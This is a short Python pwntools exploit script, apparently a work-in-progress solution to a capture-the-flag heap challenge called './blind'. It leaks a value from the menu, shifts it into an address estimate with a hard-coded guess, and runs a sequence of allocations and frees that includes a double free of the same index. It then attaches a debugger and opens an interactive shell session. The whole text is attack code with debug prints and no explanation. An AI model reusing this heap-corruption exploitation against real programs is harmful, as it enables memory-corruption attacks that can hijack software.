from pwn import *

def create(index):
	p.sendline('1')
	p.sendlineafter('Enter size and index of name on scoreboard:', index)
	p.recvuntil('Your choice: ')
def modify(index,data):
	p.sendline('2')
	p.sendlineafter('Enter index of name on scoreboard :', index)
	p.sendafter(' :',data)
	p.recvuntil('Your choice: ')
def delete(index):
	p.sendline('3')
	p.sendlineafter('Enter name index to delete:', index)
	p.recvuntil('Your choice: ')


p = process('./blind')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
readAddress = libc.symbols['read']
readAddress = readAddress >>16

# ------------------- leak phase
p.recvuntil('Your choice: ')
p.sendline('4')
p.recvuntil('This ')
leak = p.recvuntil(' ')[:-1]

# leak = int(leak,10)<<16-readAddress
if int(leak,10) <15:
	print "k the khai thasc"
	exit(0)
leak = int(leak,10)

leak = leak-15
leak = leak << 4
guess = '1'#raw_input('guess :')
leak += int(guess,10)
leak = leak <<12
print "111------------------",hex(leak)
p.recvuntil('Your choice: ')
create('300 1')
create('100 2')
delete('1')

create('100 1')
delete('1')
delete('2')
delete('1')

create('200 4')
gdb.attach(p)
create('16 24')
# delete('5')

p.interactive()
